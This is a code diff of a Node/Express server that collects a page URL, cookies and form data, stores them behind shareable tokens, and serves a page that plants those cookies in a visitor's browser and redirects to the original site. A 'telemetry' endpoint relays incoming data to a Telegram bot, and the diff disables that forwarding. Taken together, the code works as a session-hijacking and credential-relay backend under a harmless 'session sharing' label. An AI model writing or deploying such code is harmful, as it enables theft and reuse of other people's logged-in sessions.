@@ -17,55 +17,28 @@ app.use(cors({
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-// Telegram Configuration (optional, can be removed if not needed)
-const botToken = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN'; // Replace with your bot token
-const chatId = process.env.CHAT_ID || 'YOUR_CHAT_ID'; // Replace with your chat ID
-
-// Function to send a message to Telegram (optional, can be removed if not needed)
-async function sendTelegramMessage(message) {
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const params = new URLSearchParams({
-        chat_id: chatId,
-        text: message,
-        parse_mode: 'Markdown', // Optional: Use Markdown formatting
-    });
-
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: params,
-        });
-
-        const data = await response.json();
-        console.log('Telegram API Response:', data); // Log the response
-
-        if (!data.ok) {
-            console.error('Failed to send Telegram message:', data);
-        }
-    } catch (error) {
-        console.error('Error sending Telegram message:', error);
-    }
-}
-
 // Store session data in memory (replace with a database in production)
 const sessions = {};
 
 // Endpoint to generate a shareable token
 app.post('/generate-token', (req, res) => {
+    const { url, cookies, formData } = req.body;
+
+    if (!url || !cookies || !formData) {
+        return res.status(400).json({ error: 'Missing required fields: url, cookies, or formData' });
+    }
+
     const sessionData = {
-        url: req.body.url,
-        formData: req.body.formData, // Store form data
-        cookies: req.body.cookies, // Store cookies
+        url,
+        cookies,
+        formData,
         timestamp: new Date().toISOString(),
     };
 
     const token = Math.random().toString(36).substring(2, 15); // Generate a random token
     sessions[token] = sessionData; // Store session data
 
-    const shareableLink = `https://test-em43.onrender.com/share?token=${token}`; // Shareable link
+    const shareableLink = `https://your-render-app-url.onrender.com/share?token=${token}`; // Replace with your Render app URL
     res.status(200).json({ token, shareableLink });
 });
 
@@ -74,40 +47,40 @@ app.get('/share', (req, res) => {
     const token = req.query.token;
     const sessionData = sessions[token];
 
-    if (sessionData) {
-        // Return an HTML page with JavaScript to restore the session
-        res.send(`
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Continue Session</title>
-                <script>
-                    // Restore cookies
-                    document.cookie = ${JSON.stringify(sessionData.cookies)};
-
-                    // Restore form data
-                    const formData = ${JSON.stringify(sessionData.formData)};
-                    Object.keys(formData).forEach(name => {
-                        const element = document.querySelector(\`[name="\${name}"]\`);
-                        if (element) {
-                            element.value = formData[name];
-                        }
-                    });
-
-                    // Redirect to the original URL
-                    window.location.href = ${JSON.stringify(sessionData.url)};
-                </script>
-            </head>
-            <body>
-                <p>Redirecting to continue your session...</p>
-            </body>
-            </html>
-        `);
-    } else {
-        res.status(404).send('Invalid or expired token');
+    if (!token || !sessionData) {
+        return res.status(404).send('Invalid or expired token');
     }
+
+    // Return an HTML page with JavaScript to restore the session
+    res.send(`
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Continue Session</title>
+            <script>
+                // Restore cookies
+                document.cookie = ${JSON.stringify(sessionData.cookies)};
+
+                // Restore form data
+                const formData = ${JSON.stringify(sessionData.formData)};
+                Object.keys(formData).forEach(name => {
+                    const element = document.querySelector(\`[name="\${name}"]\`);
+                    if (element) {
+                        element.value = formData[name];
+                    }
+                });
+
+                // Redirect to the original URL
+                window.location.href = ${JSON.stringify(sessionData.url)};
+            </script>
+        </head>
+        <body>
+            <p>Redirecting to continue your session...</p>
+        </body>
+        </html>
+    `);
 });
 
 // Endpoint to handle incoming data (for Telegram notifications, optional)
@@ -141,8 +114,8 @@ app.post('/telemetry', async (req, res) => {
 
         console.log('Sending message to Telegram:', message); // Log the message
 
-        // Send the message to Telegram
-        await sendTelegramMessage(message);
+        // Send the message to Telegram (optional)
+        // await sendTelegramMessage(message);
 
         // Respond to the client
         res.status(200).send('Data received and Telegram notification sent successfully');
@@ -151,6 +124,18 @@ app.post('/telemetry', async (req, res) => {
         res.status(500).send('Internal Server Error');
     }
 });
+
+// Clean up old sessions every hour
+setInterval(() => {
+    const now = new Date();
+    Object.keys(sessions).forEach(token => {
+        const session = sessions[token];
+        const sessionTime = new Date(session.timestamp);
+        if (now - sessionTime > 3600000) { // 1 hour
+            delete sessions[token];
+        }
+    });
+}, 3600000);
 
 // Start the server
 app.listen(port, () => {
